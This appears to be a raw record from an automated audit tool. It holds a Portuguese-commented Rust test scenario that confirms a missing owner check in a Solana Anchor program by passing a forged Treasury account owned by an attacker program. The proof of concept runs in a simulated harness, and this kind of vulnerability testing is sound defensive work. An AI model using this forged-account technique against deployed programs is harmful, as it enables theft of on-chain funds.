attempts.raw:
{
  "plan": "O cenário inicializa uma conta Treasury legítima com a instrução `initialize`, usando uma autoridade real e o System Program. Em seguida, o ataque tenta chamar `process` passando uma conta Treasury forjada, cujo dono é um programa atacante (não o programa-alvo), mas cujos dados imitam um Treasury ativo com a autoridade correta. O efeito medido é que a conta forjada foi aceita e usada, demonstrando a falha na verificação de dono (OWNER).",
  "scenario": "let authority = Pubkey::new_unique();
let treasury_key = Pubkey::new_unique();

// Conta Treasury legítima (para baseline)
let treasury_data = anchor_account_data("Treasury", &(authority, 100u64, true));
let treasury_account = account(&env.program_id, &treasury_data, None);

// Conta forjada pelo atacante: mesmo layout, mas dono é o programa atacante
let attacker_program_id = env.attacker_program.unwrap_or_else(|| Pubkey::new_unique());
let forged_treasury_data = anchor_account_data("Treasury", &(authority, 100u64, true));
let forged_treasury_account = account(&attacker_program_id, &forged_treasury_data, None);

// Contas para o baseline (initialize)
let (system_program_id, system_program_account) = system_program_account();
let authority_wallet = wallet(1_000_000_000);
let empty_treasury = empty_account();

let init_ix = env.anchor_ix(
    "initialize",
    &(100u64,),
    vec![
        AccountMeta::new(treasury_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);

let init_accounts = vec![
    (treasury_key, empty_treasury),
    (authority, authority_wallet),
    (system_program_id, system_program_account),
];

let baseline_result = env.baseline("initialize treasury", &init_ix, &init_accounts);
assert!(baseline_result.program_result == ProgramResult::Success);

// Ataque: chamar process com a conta forjada (dono diferente do programa)
let process_ix = env.anchor_ix(
    "process",
    &(),
    vec![
        AccountMeta::new_readonly(treasury_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let attack_accounts = vec![
    (treasury_key, forged_treasury_account),
    (authority, wallet(1_000_000_000)),
];

let attack_result = env.attack("process with forged treasury owner", &process_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let forged_after = after(&attack_result, &treasury_key);
    env.effect(
        "conta forjada com dono diferente foi aceita e usada",
        forged_after.owner() == &attacker_program_id && forged_after.data() == forged_treasury_data,
    );
}"
}

